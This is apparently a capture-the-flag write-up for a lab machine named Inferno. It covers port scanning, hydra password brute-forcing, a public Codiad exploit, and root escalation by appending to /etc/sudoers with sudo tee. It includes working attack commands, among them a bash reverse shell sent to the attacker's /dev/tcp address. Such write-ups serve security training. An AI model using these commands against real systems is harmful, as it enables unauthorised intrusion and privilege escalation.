##Inferno

#Enumeration
```
# Nmap 7.91 scan initiated Mon May  3 15:28:32 2021 as: nmap -sCV -oN nmap/initial -vvv -p 23,25,21,22,88,80,106,110,194,389,443,464,636,750,777,775,808,779,783,873,1178,1210,1236,1313,1300,1314,1529,2003,2000,2121,2150,2606,2607,2603,2600,2601,2602,2608,2605,2604,2989,2988,1001,4224,4559,4557,4600,4949,5052,5051,5151,5355,5354,5432,5555,5666,5667,5674,5675,5680,6346,6514,6566,6667,8021,8081,8088,8990,9098,9359,9418,9673,10000,10083,10082,10081,11201,15345,17003,17004,17002,17001,20011,20012,24554,27374,30865,57000,60179,60177 10.10.67.42
Nmap scan report for 10.10.67.42
Host is up, received reset ttl 61 (0.17s latency).
Scanned at 2021-05-03 15:28:33 PDT for 1844s

PORT      STATE SERVICE           REASON         VERSION
21/tcp    open  ftp?              syn-ack ttl 61
22/tcp    open  ssh               syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBR1uDh8+UHIoUl3J5AJApSgrmxFtvWtauxjTLxH9B5s9E0SThz3fljXo7uSL+2hjphfHyqrdAxoCGQJgRn/o5xGDSpoSoORBIxv1LVaZJlt/eIEhjDP48NP9l/wTRki9zZl5sNVyyyy/lobAj6BYH+dU3g++2su9Wcl0wmFChG5B2Kjrd9VSr6TC0XJpGfQxu+xJy29XtoTzKEiZCoLz3mZT7UqwsSgk38aZjEMKP9QDc0oa5v4JmKy4ikaR90CAcey9uIq8YQtSj+US7hteruG/HLo1AmOn9U3JAsVTd4vI1kp+Uu2vWLaWWjhfPqvbKEV/fravKSPd0EQJmg1eJ
|   256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKFhVdH50NAu45yKvSeeMqyvWl1aCZ1wyrHw2MzGY5DVosjZf/rUzrdDRS0u9QoIO4MpQAvEi7w7YG7zajosRN8=
|   256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAdzynTIlsSkYKaqfCAdSx5J2nfdoWFw1FcpKFIF8LRv
23/tcp    open  telnet?           syn-ack ttl 61
25/tcp    open  smtp?             syn-ack ttl 61
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http              syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Dante's Inferno
88/tcp    open  kerberos-sec?     syn-ack ttl 61
106/tcp   open  pop3pw?           syn-ack ttl 61
110/tcp   open  pop3?             syn-ack ttl 61
194/tcp   open  irc?              syn-ack ttl 61
|_irc-info: Unable to open connection
389/tcp   open  ldap?             syn-ack ttl 61
443/tcp   open  https?            syn-ack ttl 61
464/tcp   open  kpasswd5?         syn-ack ttl 61
636/tcp   open  ldapssl?          syn-ack ttl 61
750/tcp   open  kerberos?         syn-ack ttl 61
775/tcp   open  entomb?           syn-ack ttl 61
777/tcp   open  multiling-http?   syn-ack ttl 61
779/tcp   open  unknown           syn-ack ttl 61
783/tcp   open  spamassassin?     syn-ack ttl 61
808/tcp   open  ccproxy-http?     syn-ack ttl 61
873/tcp   open  rsync?            syn-ack ttl 61
1001/tcp  open  webpush?          syn-ack ttl 61
1178/tcp  open  skkserv?          syn-ack ttl 61
1210/tcp  open  eoss?             syn-ack ttl 61
1236/tcp  open  bvcontrol?        syn-ack ttl 61
1300/tcp  open  h323hostcallsc?   syn-ack ttl 61
1313/tcp  open  bmc_patroldb?     syn-ack ttl 61
1314/tcp  open  pdps?             syn-ack ttl 61
1529/tcp  open  support?          syn-ack ttl 61
2000/tcp  open  cisco-sccp?       syn-ack ttl 61
2003/tcp  open  finger?           syn-ack ttl 61
|_finger: ERROR: Script execution failed (use -d to debug)
2121/tcp  open  ccproxy-ftp?      syn-ack ttl 61
2150/tcp  open  dynamic3d?        syn-ack ttl 61
2600/tcp  open  zebrasrv?         syn-ack ttl 61
2601/tcp  open  zebra?            syn-ack ttl 61
2602/tcp  open  ripd?             syn-ack ttl 61
2603/tcp  open  ripngd?           syn-ack ttl 61
2604/tcp  open  ospfd?            syn-ack ttl 61
2605/tcp  open  bgpd?             syn-ack ttl 61
2606/tcp  open  netmon?           syn-ack ttl 61
2607/tcp  open  connection?       syn-ack ttl 61
2608/tcp  open  wag-service?      syn-ack ttl 61
2988/tcp  open  hippad?           syn-ack ttl 61
2989/tcp  open  zarkov?           syn-ack ttl 61
4224/tcp  open  xtell?            syn-ack ttl 61
4557/tcp  open  fax?              syn-ack ttl 61
4559/tcp  open  hylafax?          syn-ack ttl 61
4600/tcp  open  piranha1?         syn-ack ttl 61
4949/tcp  open  munin?            syn-ack ttl 61
5051/tcp  open  ida-agent?        syn-ack ttl 61
5052/tcp  open  ita-manager?      syn-ack ttl 61
5151/tcp  open  esri_sde?         syn-ack ttl 61
5354/tcp  open  mdnsresponder?    syn-ack ttl 61
5355/tcp  open  llmnr?            syn-ack ttl 61
5432/tcp  open  postgresql?       syn-ack ttl 61
5555/tcp  open  freeciv?          syn-ack ttl 61
5666/tcp  open  nrpe?             syn-ack ttl 61
5667/tcp  open  unknown           syn-ack ttl 61
5674/tcp  open  hyperscsi-port?   syn-ack ttl 61
5675/tcp  open  v5ua?             syn-ack ttl 61
5680/tcp  open  canna?            syn-ack ttl 61
6346/tcp  open  gnutella?         syn-ack ttl 61
6514/tcp  open  syslog-tls?       syn-ack ttl 61
6566/tcp  open  sane-port?        syn-ack ttl 61
6667/tcp  open  irc?              syn-ack ttl 61
|_irc-info: Unable to open connection
8021/tcp  open  ftp-proxy?        syn-ack ttl 61
8081/tcp  open  blackice-icecap?  syn-ack ttl 61
|_mcafee-epo-agent: ePO Agent not found
8088/tcp  open  radan-http?       syn-ack ttl 61
8990/tcp  open  http-wmap?        syn-ack ttl 61
9098/tcp  open  unknown           syn-ack ttl 61
9359/tcp  open  unknown           syn-ack ttl 61
9418/tcp  open  git?              syn-ack ttl 61
9673/tcp  open  unknown           syn-ack ttl 61
10000/tcp open  snet-sensor-mgmt? syn-ack ttl 61
10081/tcp open  famdc?            syn-ack ttl 61
10082/tcp open  amandaidx?        syn-ack ttl 61
10083/tcp open  amidxtape?        syn-ack ttl 61
11201/tcp open  smsqp?            syn-ack ttl 61
15345/tcp open  xpilot?           syn-ack ttl 61
17001/tcp open  unknown           syn-ack ttl 61
17002/tcp open  unknown           syn-ack ttl 61
17003/tcp open  unknown           syn-ack ttl 61
17004/tcp open  unknown           syn-ack ttl 61
20011/tcp open  unknown           syn-ack ttl 61
20012/tcp open  ss-idi-disc?      syn-ack ttl 61
24554/tcp open  binkp?            syn-ack ttl 61
27374/tcp open  subseven?         syn-ack ttl 61
30865/tcp open  unknown           syn-ack ttl 61
57000/tcp open  unknown           syn-ack ttl 61
60177/tcp open  unknown           syn-ack ttl 61
60179/tcp open  unknown           syn-ack ttl 61
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May  3 15:59:17 2021 -- 1 IP address (1 host up) scanned in 1845.16 seconds
```
There are quite a few ports open on the system however only the ssh port and http server port on 22 and 80 respectively can be verified to be running so lets start with those.

#Web Server Port 80
```
Oh quanto parve a me gran maraviglia
quand'io vidi tre facce a la sua testa!
L'una dinanzi, e quella era vermiglia;

l'altr'eran due, che s'aggiugnieno a questa
sovresso 'l mezzo di ciascuna spalla,
e se' giugnieno al loco de la cresta 
```
The page simply has this text along with a picture so we start up gobuster while we check the image and text for any clues. The text just seems to be a passage from dante's inferno and the image as well with nothing really to find.
We eventually find a /inferno directory which requires a username and password. We haven't gotten much so we can try and guess some usernames and a bruteforce a password
```
# cat users.txt
root
admin
administrator
dante
inferno

# hydra -t 64 -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.67.42 http-get /inferno
```
We end up finding a valid password for the admin user, so lets use the credentials. We are immediately presented another login page, however thankfully our credentials work again.

It seems we have gained access to web IDE called codiad, we can poke around with the files here, but it seems that we cannot create or edit files unfortunately. However if we look up codiad exploits we find the following, https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit, which effects the latest version so let try it out. After working with the syntax for a little bit we end up being able to get the exploit to work with the following command
```
python2 Codiad-Remote-Code-Execute-Exploit/exploit.py http://admin:redacted@10.10.67.42/inferno/ 'admin' 'redacted' 10.13.1.12 8888 linux
[+] Please execute the following command on your vps:
echo 'bash -c "bash -i >/dev/tcp/10.13.1.12/8889 0>&1 2>&1"' | nc -lnvp 8888
nc -lnvp 8889
[+] Please confirm that you have done the two command above [y/n]
[Y/n] y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"admin"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"inferno","path":"\/var\/www\/html\/inferno"}}
[+] Writeable Path : /var/www/html/inferno
[+] Sending payload...
{"status":"error","message":"No Results Returned"}
[+] Exploit finished!
[+] Enjoy your reverse shell!
```
We get a shell however we cannot maintain a persistant shell as something is set to kill bash shells at regular increments
```
# nc -lnvp 8889
listening on [any] 8889 ...
connect to [10.13.1.12] from (UNKNOWN) [10.10.67.42] 60794
bash: cannot set terminal process group (913): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Inferno:/var/www/html/inferno/components/filemanager$ exit
```
We can workaround this however by stabalizing our shell with /bin/sh instead of /bin/bash as follows
```
python3 -c "import pty;pty.spawn('/bin/sh')"
export TERM=xterm;export SHELL=/bin/sh
ctrl+z
stty raw -echo; fg
```
Now we won't be booted off the system and cant start to finally look around.

#Initial Foothold
We are currently the www-data user however we can access the /home/dante directory however we can read the local.txt flag that is present. So we explore what other files are accessible.
We find several files on the system that we could begin to take a look at but after quickly looking through all of them we find a immediate standout in /home/dante/Downloads/.download.dat which appears to be a hexdump, that when converted contains the following
```
«Or se’ tu quel Virgilio e quella fonte
che spandi di parlar sì largo fiume?»,
rispuos’io lui con vergognosa fronte.

«O de li altri poeti onore e lume,
vagliami ’l lungo studio e ’l grande amore
che m’ha fatto cercar lo tuo volume.

Tu se’ lo mio maestro e ’l mio autore,
tu se’ solo colui da cu’ io tolsi
lo bello stilo che m’ha fatto onore.

Vedi la bestia per cu’ io mi volsi;
aiutami da lei, famoso saggio,
ch’ella mi fa tremar le vene e i polsi».

dante:redacted
```
Looks like some credentials were placed here for dante so lets switch over to dante and get the local.txt flag. We again run into the same problem as before where our bash shell is killed even if we connect over ssh so we just need to stabalize with a /bin/sh shell instead and we can proceed

#Privilege Escalation
```
$ sudo -l
Matching Defaults entries for dante on Inferno:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee
```
going to gtfo bins we find the following
```
LFILE=file_to_write
echo DATA | sudo tee -a "$LFILE"
```
so we can peform unrestricted write access so lets put dante in the /etc/sudoers file and allow them to run all commands instead with the following
```
$ echo "%dante ALL=(ALL:ALL) ALL" | sudo tee -a "/etc/sudoers"
%dante ALL=(ALL:ALL) ALL
$ sudo -l
Matching Defaults entries for dante on Inferno:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee
    (ALL : ALL) ALL
$ sudo /bin/sh
[sudo] password for dante:
# whoami
root
# cd /root
# ls -la
total 32
drwx------  5 root root 4096 Jan 11 15:45 .
drwxr-xr-x 24 root root 4096 Jan 11 14:57 ..
lrwxrwxrwx  1 root root    9 Jan 11 15:22 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-x---  3 root root 4096 Jan 11 15:45 .config
drwxr-xr-x  3 root root 4096 Jan 11 15:30 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   79 Jan 11 15:45 proof.txt
drwx------  2 root root 4096 Jan 11 15:19 .ssh
#
```
We then find the root flag proof.txt in /root
